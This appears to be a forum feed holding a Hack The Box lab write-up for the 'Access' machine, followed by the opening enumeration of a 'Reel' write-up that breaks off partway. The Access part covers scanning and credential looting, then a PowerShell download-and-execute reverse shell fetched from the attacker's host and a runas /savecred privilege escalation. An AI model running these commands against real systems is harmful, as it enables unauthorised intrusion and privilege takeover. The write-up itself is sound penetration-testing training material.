  <a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">How to identify which OS is running at remote host?</a>
</h4>

<div class="tags">
  <strong>linux, windows</strong>
</div>

<div class="date">
  
  answered by
  <a href="https://superuser.com/users/238360/ary" target="_blank" rel="noopener nofollow ugc">
    Ary
  </a>
  on <a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">05:45PM - 16 Jul 13 UTC</a>
</div>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Now we know that the OS is most likely a Windows.</p>
<p>Let us enumerate the open ports of this machine by using Nmap.<br>
If you’re not familiar with Nmap, you should do some research. It is an essential tool which the most Penetration Testers are using.</p>
<p>Resource: <a href="https://nmap.org/" rel="noopener nofollow ugc">https://nmap.org/</a></p>
<blockquote>
<p>nmap 10.10.10.98 -Pn -n -p- --open -oN allports.nmap --stats-every 30s --max-retries 2 -T5</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dab9cc34a75a76bbc9f9d8e18e3b58daf35ce9d4.png" alt="grafik" data-base62-sha1="vcW9OiWsbgOVAtJXSeU40t59HrS" width="690" height="177"></p>
<p>Alright, what do we have so far?</p>
<ul>
<li>OS: Windows (most likely)</li>
<li>FTP</li>
<li>Telnet</li>
<li>HTTP</li>
</ul>
<h2>2. Port filtering</h2>
<p>It’s possible that you will discover much more open ports on other machines and it could be a pain to type them manually.<br>
Let us filter these by using Bash.</p>
<blockquote>
<p>cat allports.nmap | grep tcp | cut -d"/" -f1 | tr “\n” “,” | sed ‘s/.$//g’</p>
</blockquote>
<p>If you don’t understand the command, you can visit this site to get a better understanding of it: <a href="https://explainshell.com/" rel="noopener nofollow ugc">https://explainshell.com/</a></p>
<p>Now we can save the output of it in a variable.</p>
<blockquote>
<p>PORTS=$(cat allports.nmap | grep tcp | cut -d"/" -f1 | tr “\n” “,” | sed ‘s/.$//g’)</p>
</blockquote>
<p>To verify it looks great, we should ‘echo’ it.</p>
<blockquote>
<p>echo $PORTS</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8bb6d7ded72f512dbcb4d2e9fe7c36c88d5f0b3b.png" alt="grafik" data-base62-sha1="jVY6I3GpQqNP8hmBzKLdZmvMXwv" width="689" height="33"></p>
<p>And now we can proceed.</p>
<h2>3. Service enumeration</h2>
<p>Service enumeration is the part where we try to find out more information about the running services. Enumeration doesn’t mean only to collect as much information as possible moreover you have to create an overview based on all the information you had received.</p>
<p>Let us use Nmap for service scan and the Nmap Scripting Engine (NSE) to collect more information about the running services.</p>
<blockquote>
<p>nmap 10.10.10.98 -p$PORTS -sV -sC -oN services.nmap --stats-every 30s --max-retries 2</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8b730b25584fd9585403de71b487c73e9b935332.png" alt="grafik" data-base62-sha1="jTCQzQZ1Y9dO6tjiXHsdWsPTFrc" width="690" height="60"></p>
<p>So here is how our results look like:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc38db5d7423233d23447bbf430d6db6fa22a023.png" alt="grafik" data-base62-sha1="t8DdB0WFIcBEG7sfgdGqBckNC0j" width="517" height="180"></p>
<p>Look at the information we’ve got so far closely.<br>
Every information in this result is crucial for us.<br>
<strong>You should append the info we just found out to our previous overview.</strong></p>
<p>You also should notice the Telnet line. Take a closer look at it. What exactly do you see there?</p>
<p>There is a question mark. Right. What could this mean?<br>
<strong>[Important] Train your research skills and try to find it out on your own.</strong></p>
<p>Sometimes it can be essential to search for information like this little thing.</p>
<h2>4. FTP</h2>
<p>Let us take a look at the FTP server. You should notice from the previous Nmap scan that we have ‘Anonymous login allowed’. So let’s use it.</p>
<blockquote>
<p>ftp 10.10.10.98</p>
</blockquote>
<p><strong>Credentials:</strong><br>
Name: <em>anonymous</em><br>
Password: <em>anon</em></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a12a6ea8b6f29829576e12119753a0bc065c9309.png" alt="grafik" data-base62-sha1="mZJMzyFhXGlZyBrYZudy9lK8JS1" width="635" height="275"></p>
<p>By looking into these directories, we found some interesting files.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a7af24c49e0e93f27d3725a847a567c764a20095.png" alt="grafik" data-base62-sha1="nVoYP9Z0W075yIoIKMU8eli772R" width="530" height="282"></p>
<p>Now we have to download it. I will show you two different methods you can do it.<br>
We can use FTP with the ‘<strong>get</strong>’  command, or we use ‘<strong>wget</strong>’ to download these files.<br>
But first, we have to still organised. So we create an FTP directory where we will store the files.</p>
<h3>GET command</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4a2d6b7179fdd8665c1664ea1768661359947f98.png" alt="grafik" data-base62-sha1="aAcDVOrZZZ5XCAElMlL93iRm8MU" width="482" height="350"></p>
<h3>WGET</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c83b4f4cbd167d4c09105f3c545883a98bc81fa.png" alt="grafik" data-base62-sha1="1MHUra6RuhCWuf8txau4ne9Y4Km" width="690" height="42"></p>
<p>You should read the manual of ‘<strong>wget</strong>’ to understand the command and find out what <strong>PASV</strong> mode of an FTP server is.</p>
<p>Before we begin to analyse the files let us enumerate the other services too.</p>
<h2>5. Telnet</h2>
<p>Did you find out what the question mark means?<br>
Now we will take a look at this service by using <strong>telnet</strong>.</p>
<blockquote>
<p>telnet 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/deaf9a6bf9b72867fead252950e576cbd813a655.png" alt="grafik" data-base62-sha1="vLYe2YRFzJKYq00tUyK6ogj1Mqx" width="574" height="131"></p>
<p>You will notice that it will take a few seconds before the login prompt appears.<br>
That is the reason for the question mark at the Nmap scan. Nmap couldn’t determine this service as Telnet because the response took to long. But because Telnet is basically on TCP port 23 it gave us the output of <em>maybe</em> it’s Telnet.</p>
<p>We don’t have any credentials to log in yet and to start bruteforcing this service just doesn’t make sense without any information of the ‘organisation’ or the machine we are trying to root. If we shouldn’t find any useful information than we can try to bruteforce it, but now let us take a look at the Web server.</p>
<h2>6. HTTP</h2>
<p>First, we should just interact with the Web server. Let us visit it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3aca6e232f45dea5e79df2d7545269ca9422a2d1.jpeg" alt="grafik" data-base62-sha1="8o5oG4rBdI1GW3ga93oLVRjAQwh" width="510" height="375"></p>
<p>Here we can download the image for later analysis.<br>
Also, we want to know how the header looks like. Which ‘<strong>OPTIONS</strong>’ are allowed?.<br>
The questions you should ask yourself:</p>
<ul>
<li>Are there some security headers?</li>
<li>What kind of security headers exists?</li>
</ul>
<p>Again, train your research skills and learn new things. Use all search engines and methods you know to find out the information you don’t know.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e82aabeff8dda42d561c90e52216022141c448d.png" alt="grafik" data-base62-sha1="bcxc77Ki1E62gRfiDHbpSxlvGrz" width="690" height="321"></p>
<p>From this point, we want to spider the Web server to find out which directories on it exist.<br>
Therefore we will use <strong><a href="https://portswigger.net/burp" rel="noopener nofollow ugc">Burp Suite</a></strong>.<br>
After setting up our Proxy-Settings and configure our target in Burp we can send another GET request to the Web server and intercept it. By sending it to spider in Burp, it will hopefully find some useful files or directories.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3c86210f17cb519c4b1a962ea4fb3fdd246da704.jpeg" alt="grafik" data-base62-sha1="8Dq19pl1HpT1Ei68rVvDwuT4CdS" width="690" height="211"></p>
<p>By clicking on <strong>Action</strong> you can send the request to Spider in Burp.<br>
Burp Spider is a crawler which will be used to map a Web server (<a href="https://www.hackingarticles.in/spider-web-applications-using-burpsuite/" rel="noopener nofollow ugc">learn more</a>).</p>
<p>Now our results look like we don’t have much here:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/31e22f2d5e3b9e01f3f700b8d986193220026345.png" alt="grafik" data-base62-sha1="77hZBAzYbU7s2GLRgbMIfsIMytT" width="517" height="191"></p>
<p>From here we can make another step and bruteforce the Web server with <strong>GET</strong> requests for different files and directories. There exist a lot of tools out there like <strong>gobuster</strong>, <strong>dirbuster</strong>, <strong>dirb</strong> and <strong>dirsearch</strong>.<br>
At this example, I will use <strong>dirsearch</strong>. It isn’t installed in Kali Linux by default.<br>
So <a href="https://github.com/maurosoria/dirsearch" rel="noopener nofollow ugc">here</a> is the resource for dirsearch where you can download it.</p>
<p>You can download it by using the following command:</p>
<blockquote>
<p>git clone <a href="https://github.com/maurosoria/dirsearch.git" rel="noopener nofollow ugc">https://github.com/maurosoria/dirsearch.git</a> /opt/dirsearch/</p>
</blockquote>
<p>Also, to make it globally executable you can create a symbolic link to <code>/usr/local/bin/</code> .</p>
<blockquote>
<p>ln -s /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch</p>
</blockquote>
<p>By typing:</p>
<blockquote>
<p>dirsearch -h</p>
</blockquote>
<p>you will see all the options it has. Now let us enumerate the Web server with it.</p>
<blockquote>
<p>dirsearch -u <a href="http://10.10.10.98" rel="noopener nofollow ugc">http://10.10.10.98</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 --max-retries=2 -e html,jpg,png,xml,aspx,asp,htm,asmx,dll,db</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/371b64a94d6063f9a9e199832c4ee41d8b5b2005.png" alt="grafik" data-base62-sha1="7RuWVVn9LOCTrCSRoC1vfT5A1uJ" width="690" height="143"></p>
<p>Unfortunately, nothing is interesting in the Web server. Another tool we can use is <strong>nikto</strong>.<br>
This will provide us with a lot of information:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/99252aed170009ac618550eaa08006cebded110d.png" alt="grafik" data-base62-sha1="lQMGqHEbH96tcOJosyohsW5Hr1H" width="690" height="376"><br>
<strong>You should always note all of the information we collected so far during the process.</strong></p>
<p>Let’s move on.</p>
<h2>7. Microsoft Access Database</h2>
<p>At this point, we should determine the file types of the files we are working with.<br>
This could be done with a tool called ‘<strong>file</strong>’.</p>
<blockquote>
<p>file Access\ Control.zip<br>
file backup.mdb</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/acec852dc5fddf438790aef5d74de6e50687834a.png" alt="grafik" data-base62-sha1="oFKRLpr9PwnqotSr2esdD9ObYim" width="653" height="74"></p>
<p>Another method to find more information we can use ‘<strong>exiftool</strong>’.</p>
<h3>Access Control.zip</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/89216dcaefe5ecc0e811ca9549f2e1f447988c95.png" alt="grafik" data-base62-sha1="jz728AoAxc1ymVIJBblTuPkpNjv" width="688" height="359"></p>
<h3>backup.mdb</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/757bdaf67555e974b68d39bea114ce3831825b8a.png" alt="grafik" data-base62-sha1="gLjdOD3tIy5ZYkQMr81QhbIKP2i" width="615" height="180"></p>
<p>Notice that ‘<strong>exiftool</strong>’ couldn’t determine the file type. So we have to do it manually.</p>
<blockquote>
<p>Ok Google: mdb file</p>
</blockquote>
<p>On the first result page, you will be able to find this URL: <a href="https://fileinfo.com/extension/mdb" rel="noopener nofollow ugc">https://fileinfo.com/extension/mdb</a><br>
It provides us with the information we need.</p>
<p><strong>I can’t repeat it often enough: note it!</strong></p>
<p>Another question:</p>
<blockquote>
<p>Ok, Google: extract mdb data kali</p>
</blockquote>
<p>Here you will find a website called <a href="http://mdbtools.sourceforge.net/install/x53.htm" rel="noopener nofollow ugc">http://mdbtools.sourceforge.net/install/x53.htm</a>.</p>
<p>By using ‘<strong>mdbtools</strong>’ we can work with this file. Let us take a look at how it does look inside.</p>
<blockquote>
<p>mdb-tables backup.mdb</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9fb6eb8a0874f431dab07877332299c6138fb511.png" alt="grafik" data-base62-sha1="mMTOYKhPPnyKMgZGr8HHZrohRN7" width="488" height="108"></p>
<p>Ok. We have to structure it to make it easily readable.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/0/03e23915903e9e2efee92fa60596044ebcb049bd.png" alt="grafik" data-base62-sha1="ym704ti82tGun3kB9YpJbNoXFP" width="517" height="198"></p>
<p>We see the <code>auth_user</code> table inside. Let’s export the data from this table.</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr “,” " " | grep “\”" | cut -d" " -f2-3 | sed ‘s/\"//g’ | tr " " “:”</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2a08120a9bc87b0a90d41058e00676b09b948e00.png" alt="grafik" data-base62-sha1="5ZPlmUCwM4wn5m2cq2Ts8nMqREI" width="690" height="151"></p>
<p>Also, we should save this information.</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr “,” " " | grep “\”" | cut -d" " -f2-3 | sed ‘s/\"//g’ | tr " " “:” &gt; creds.txt</p>
</blockquote>
<p>Another way we can use is the following:</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr “,” " " | column -t</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3e888fa5f6b585e2e584e2b044fb480d3b320438.png" alt="grafik" data-base62-sha1="8VcbppNJHWHdNDlqWLGWw9AHg0M" width="690" height="66"></p>
<h2>8. ZIP File extraction</h2>
<p>Next file is our ZIP archive. We want to know what’s inside of it.</p>
<blockquote>
<p>unzip Access\ Control.zip</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6461456bb33f569873b7e2e0bfaa366258bcd040.png" alt="grafik" data-base62-sha1="ek09gY0j45Ksyy83bOdYCQIHKBG" width="668" height="56"></p>
<p><strong>Do some research. Find out why this error appears.</strong></p>
<blockquote>
<p>7z -e Access\ Control.zip</p>
</blockquote>
<p>Now it’s asking us for a password. Did we find some credentials already?<br>
Let us try to use them:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/34a39516d60a1db5406965b70744746931f907b3.png" alt="grafik" data-base62-sha1="7vFiJfOvPXrHxua4nXPkzO9HPxN" width="473" height="270"></p>
<p>We extracted a file called ‘<strong>Access Control.pst</strong>’. What kind of file is it?</p>
<blockquote>
<p>file Access\ Control.pst</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/704865563e8405fd842dda0311c41584f4ca910d.png" alt="grafik" data-base62-sha1="g1iAdc3tqeNWLb7gC0MM6KY3QfP" width="659" height="147"></p>
<p>Find out a way on your own to read the content.</p>
<blockquote>
<p>cat ‘<strong>Access Control.mbox</strong>’ | head -n 25</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0670dcd65b08f86a0ad4ce2b95d1f65cfac39c98.png" alt="grafik" data-base62-sha1="UYFESOjrP65VDNDe8AVdUmMOG4" width="690" height="264"></p>
<h2>9. Telnet Login</h2>
<p>At this point, we found other credentials which we can use.<br>
Let us try to log in by using these.</p>
<blockquote>
<p>telnet 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ceac57a219235ab59c5e1227761c8afe3777a1d.png" alt="grafik" data-base62-sha1="fxwyR6vnjzef9w1xjTOr8oo1ML3" width="462" height="195"><br>
We could successfully log in by using the credentials we found from the ZIP file.<br>
Now it’s time for local enumeration, but first, it’s always better to work with a reverse shell.</p>
<p><strong>Make sure you understand how a reverse shell works because it’s an essential part in this whole area.</strong></p>
<h2>10. Reverse Shell through PowerShell</h2>
<p>But before we can obtain a reverse shell we have to plan it, understand how it should work and how the whole scenario of it will look like.<br>
<strong>We have to force our target to connect back to us.</strong> …<em>(cough) firewalls (cough)</em>…</p>
<p>What do we need:</p>
<ol>
<li>Reverse shell script</li>
<li>Web server</li>
<li>Listener</li>
<li>Execution command</li>
</ol>
<h3>1. Reverse shell Script</h3>
<p><a href="https://github.com/samratashok/nishang" rel="noopener nofollow ugc">Nishang</a> created an excellent collection of different PowerShell scripts. One of these we will use to obtain our reverse shell. We will copy it to our working directory.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a3b6df933bd1f91c410c1d7236d50e6e52d4b8c6.png" alt="grafik" data-base62-sha1="nmhDbrbwjRgPMsSjGKmyeJ7Tig6" width="690" height="224"></p>
<p>We want to make sure that our target machine will execute it directly. Here we have to make some changes for that. By looking into the reverse shell script, we will see an example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/252457a81f132c14d60d9da1aaa057881afd8f9e.png" alt="grafik" data-base62-sha1="5izwQ0yPnhd0zz0smcr1DbqQVR4" width="690" height="256"></p>
<p>We will copy this line at the end of the file and remove the “PS &gt;”. After these changes it will look like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e2d1291da41f41409149af377e7cdfe0c6ddc69b.png" alt="grafik" data-base62-sha1="wmw22j6XwBd603tSyICbh5yqBeP" width="634" height="247"></p>
<h3>2. Web server</h3>
<p>There exist a lot of methods to share files. We will use this time a Python3 Web server module in the directory we stored our script.</p>
<blockquote>
<p>python3 -m http.server 80</p>
</blockquote>
<h3>3. Listener</h3>
<p>After that, we have to start our listener and listen on the port we set in the script before. In my case, it was the TCP port <strong>2201</strong>. Therefore I will use <strong>Netcat</strong>.</p>
<blockquote>
<p>nc -nlvp 2201</p>
</blockquote>
<h3>4. Execution command</h3>
<p>The execution command for this will be:</p>
<blockquote>
<p>C:\Users\security&gt; powershell -c IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.5/revshell.ps1" rel="noopener nofollow ugc">http://10.10.14.5/revshell.ps1</a>’)</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/733122b77cba6f363717894f2d0d4c00119ffe1b.png" alt="grafik" data-base62-sha1="gr2bgjXYjgPskoOd9qRWOtvBV6r" width="690" height="218"></p>
<h2>11. Local enumeration</h2>
<p><a href="https://github.com/411Hall" rel="noopener nofollow ugc">411Hall</a> created an awesome enumeration PowerShell script called <a href="https://github.com/411Hall/JAWS" rel="noopener nofollow ugc">JAWS</a> to identify privilege escalation vectors quickly.<br>
We will let our target system download and execute it the same way we did it with the reverse shell.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/64cde319e4c2758817f7205695dce43599edcc04.png" alt="grafik" data-base62-sha1="enKRcJDEplNR3msTwHFbl5ZRI0c" width="690" height="352"></p>
<p>It will take a few minutes. So don’t quit the session.<br>
The most interesting part is this one:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ffd3a83f6c191948fad8e5fc1d9f3de6aed1db5.png" alt="grafik" data-base62-sha1="kxMOInr5NJmUUAk2JZ3iNj6ePNX" width="530" height="185"></p>
<p>Also, let us take a look at the desktop of the ‘security’ user.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/48c556e7a3f6e30fcebed21a9cd35e16aa65e7bd.png" alt="grafik" data-base62-sha1="anLaTy4fsHRiGKPEmvwa69Xu9ad" width="518" height="180"></p>
<p>So it seems we have here some stored credentials for the Administrator on this machine.<br>
<strong>If we don’t know how to export them what else could we do?</strong></p>
<h2>12. Privilege Escalation</h2>
<p>Let us ask Google:</p>
<blockquote>
<p>Ok, Google: windows currently stored credentials privilege escalation</p>
</blockquote>
<p>Also here on the first page, you will find a GitHub repository of <a href="https://github.com/swisskyrepo" rel="noopener nofollow ugc">swisskyrepo</a> to his <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" rel="noopener nofollow ugc">Windows - Privilege Escalation</a> cheat sheet.<br>
If we press <strong>CTRL+F</strong> and search for “stored credentials” you will see this example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/011fdc691793431fe758fadc3e600cf7e035b33e.png" alt="grafik" data-base62-sha1="9WJPSqbNSQPJIWJzrG9FQ9XNiC" width="690" height="276"><br>
<strong>Ok. Do we need an EXE file or can we do something else?</strong></p>
<p>What do you think about another reverse shell but this time with Administrator privileges?</p>
<p>Go back to <strong>10. Reverse Shell through PowerShell</strong> if you don’t know how it does work or how it should look like. But I think this should be clear right now. It’s the same scenario in this situation.</p>
<ol>
<li>We will just change the TCP port of our reverse shell script to <strong>2202</strong>.</li>
<li>Run our python web server.</li>
<li>Set up our listener on TCP port 2202.</li>
<li>Execute it the same way with PowerShell with the currently stored credentials.</li>
</ol>
<h3>1. Reverse Shell Script</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/61bd1edc55bcffd0ac14bfee9acff9acc7d535e3.png" alt="grafik" data-base62-sha1="dWDvdCdoT8SagPNtb6ABIwz9Agb" width="632" height="214"></p>
<h3>2. Web server</h3>
<blockquote>
<p>python3 -m http.server 80</p>
</blockquote>
<h3>3. Listener</h3>
<blockquote>
<p>nc -nlvp 2202</p>
</blockquote>
<h3>4. Execution command</h3>
<blockquote>
<p>PS C:\Users\security&gt; runas /savecred /user:ACCESS\Administrator “powershell.exe IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.5/revshell.ps1" rel="noopener nofollow ugc">http://10.10.14.5/revshell.ps1</a>’)”</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ae628d5ef86dab9182dabd11a292eb8f24a19051.png" alt="grafik" data-base62-sha1="oSGe4JuLtbOSyRlPw2n8K3J6vgR" width="690" height="382"></p>
<h2>12. Challenge</h2>
<p>For this challenge, your goals will be</p>
<ol>
<li>A <strong>Meterpreter</strong> session</li>
<li>Upload Mimikatz and read the credentials</li>
</ol>
<p>Restrictions:</p>
<ol>
<li>The usage of <strong>Empire</strong> or their scripts for this challenge is forbidden.</li>
</ol>
<p>Have fun!</p>
<hr>
<blockquote>
<p>YouTube video coming soon!</p>
</blockquote>
<p>Best regards,<br>
Cry0l1t3<br>
<a href="https://www.shell-affect.com" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png" alt="logo" data-base62-sha1="5EBtqZQBcIDxRT3RlPHxV5GcRmg" width="477" height="96"></a></p>
<p>Official Website: <a href="https://www.shell-affect.com" rel="noopener nofollow ugc">https://www.shell-affect.com</a><br>
Twitter: <a href="https://twitter.com/ShellAffect" rel="noopener nofollow ugc">https://twitter.com/ShellAffect</a><br>
Xing: <a href="https://www.xing.com/companies/shell-affect" rel="noopener nofollow ugc">https://www.xing.com/companies/shell-affect</a><br>
YouTube: <a href="https://www.youtube.com/channel/UCgxyvJCaG1vRLM2GIpyBiWQ" rel="noopener nofollow ugc">https://www.youtube.com/channel/UCgxyvJCaG1vRLM2GIpyBiWQ</a></p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/htb-shell-affect-access-writeup/13085">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/htb-shell-affect-access-writeup/13085</link>
          <pubDate>Thu, 18 Apr 2019 13:09:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-13085</guid>
          <source url="https://0x00sec.org/t/htb-shell-affect-access-writeup/13085.rss">[HTB] SHELL AFFECT - Access - WriteUp</source>
        </item>
        <item>
          <title>[HTB] SHELL AFFECT - Reel - WriteUp</title>
          <dc:creator><![CDATA[Cry0l1t3]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/52ad40e8b33e8667c3c4f3f6ae18a37c334240da.png" alt="grafik" data-base62-sha1="bNolujQq86vaHN3stPLBkHB5zgC" width="690" height="242"></p>
<p>Hey guys,<br>
how are you doing?</p>
<p>This is a writeup for the HackTheBox VM called “Reel”.<br>
At this topic, I will focus mainly on<br>
<strong>how to find the information you need</strong> &amp;<br>
<strong>how to work with the information you already have</strong><br>
to root this box.<br>
At the end of this topic, there will be a <strong>challenge</strong> for you which will require a little bit more than I explained in this writeup.</p>
<h2>Table of contents</h2>
<pre><code class="lang-auto">1. Enumeration
2. FTP
3. Exploitation Research
4. RTF file creation
5. HTA file creation
6. Exploitation
7. Local Enumeration
8. Extract Password from an XML file
9. SSH Login
10. Enumeration with BloodHound
11. SMB File Transfer
12. BloodHound AD-Relationships
13. Privilege Escalation using PowerView
14. Challenge
</code></pre>
<h2>1. Enumeration</h2>
<p>Enumeration is the key. That’s always the first step we do. Get an overview of the target is the essential part.<br>
I like to scan with nmap only for open ports first because of service scans and script scans used by nmap could create much traffic. By creating to much traffic, it could happen that some ports will be shown as closed because of these scans will be blocked.</p>
<p>The method I use to scan for open ports looks like this:</p>
<blockquote>
<p>nmap 10.10.10.77 -Pn -n -p- --open -oN allports.nmap --stats-every 10s --max-retries 2 -T5</p>
</blockquote>
<p># <em>-Pn - Treat all hosts as online</em><br>
# <em>-n - Never do DNS resolution</em><br>
# <em>--max-retries - Caps number of port scan probe retransmissions.</em><br>
# <em>--stats-every - Periodically prints a timing status message after each interval of <em><code>&lt;time&gt;</code></em> .</em></p>
<p>The result of this scan looks following:</p>
<blockquote>
<p><strong>PORT      STATE SERVICE</strong><br>
21/tcp    open  ftp<br>
22/tcp    open  ssh<br>
25/tcp    open  smtp<br>
135/tcp   open  msrpc<br>
139/tcp   open  netbios-ssn<br>
445/tcp   open  Microsoft-ds<br>
593/tcp   open  http-rpc-epmap<br>
49159/tcp open  unknown</p>
</blockquote>
<p>Another point why I like to use this method is because I can filter all these ports and declare them as a variable in bash.<br>
Something like this:</p>
<blockquote>
<p>PORTS=$(cat allports.nmap | grep tcp | cut -d"/" -f1 | tr “\n” “,” | sed ‘s/.$//g’)</p>
</blockquote>
<p>The output of this variable  looks than:</p>
<blockquote>
<p>echo $PORTS<br>
21,22,25,135,139,445,593,49159</p>
</blockquote>
<p>Now we can use the variable for further service &amp; script scans:</p>
<blockquote>
<p>nmap 10.10.10.77 -p$PORTS -sV -sC -oN services.nmap --stats-every 10s --max-retries 2</p>
</blockquote>
<p>Results of the service and script scans:</p>
<pre><code class="lang-auto">PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       &lt;DIR&gt;          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
...
Host script results:
|_clock-skew: mean: -31m56s, deviation: 34m37s, median: -11m57s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2019-04-08T06:59:23+01:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-04-08 07:59:25
|_  start_date: 2019-04-08 06:36:42

</code></pre>
<p>Alright, what do we have so far?<br>
OS: Windows Server 2012 R2 Standard 9600 6.3<br>
System time is actual.<br>
Services:</p>
<ul>
<li>FTP (Anonymous Login)</li>
<li><strong>OpenSSH (?)</strong></li>
<li>SMTP</li>
<li>MSRPC</li>
<li>SMBv2 (REEL.HTB.LOCAL)</li>
<li>MSRPC over HTTP (TCP 593)</li>
</ul>
<p>First thing what looks different is the <strong>OpenSSH</strong> service because Windows doesn’t have SSH as default service.</p>
<p>So here we can take a deeper look at it and see which banner we will get from this service.</p>
<blockquote>
